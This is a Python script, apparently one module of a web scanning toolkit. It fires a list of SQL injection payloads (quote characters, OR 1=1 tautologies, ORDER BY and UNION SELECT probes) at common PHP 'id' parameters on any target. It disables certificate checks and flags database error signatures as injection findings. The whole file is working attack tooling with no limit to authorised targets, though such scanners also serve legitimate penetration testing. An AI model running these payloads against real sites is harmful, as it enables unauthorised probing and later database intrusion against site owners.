import requests
import urllib3
urllib3.disable_warnings()

SQLI_PAYLOADS = [
    "'", "''", "`", "``", ",", "\"", "\"\"",
    "/", "//", "\\", "//", ";",
    "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--",
    "\" OR \"1\"=\"1", "\" OR 1=1--",
    "' AND 1=1--", "' AND 1=2--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "mysqli_fetch",
    "pg_exec",
    "sqlite_",
    "odbc_exec",
    "ora-",
    "microsoft ole db provider for sql server",
    "syntax error",
]

def run(target):
    if not target.startswith("http"):
        target = "http://" + target

    print(f"    [*] Target: {target}")
    print(f"    [*] Testing {len(SQLI_PAYLOADS)} SQLi payloads...\n")

    found = []
    tested = 0

    # Test URL parameters
    test_urls = [
        f"{target}/index.php?id=1",
        f"{target}/item.php?id=1",
        f"{target}/product.php?id=1",
        f"{target}/view.php?id=1",
        f"{target}/page.php?id=1",
    ]

    for url in test_urls:
        base_url = url.split("?")[0]
        param = url.split("?")[1]

        for payload in SQLI_PAYLOADS:
            test_url = f"{base_url}?{param}{payload}"
            try:
                r = requests.get(test_url, timeout=5, verify=False)
                body = r.text.lower()
                tested += 1

                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        result = {
                            "url": test_url,
                            "payload": payload,
                            "signature": sig
                        }
                        print(f"    \033[92m[+] SQLi Found!\033[0m")
                        print(f"        URL: {test_url}")
                        print(f"        Payload: {payload}")
                        print(f"        Signature: {sig}\n")
                        found.append(result)
                        break
            except:
                pass

    print(f"    [*] Tested {tested} requests")
    if not found:
        print("    [-] No SQLi vulnerabilities detected")

    return found
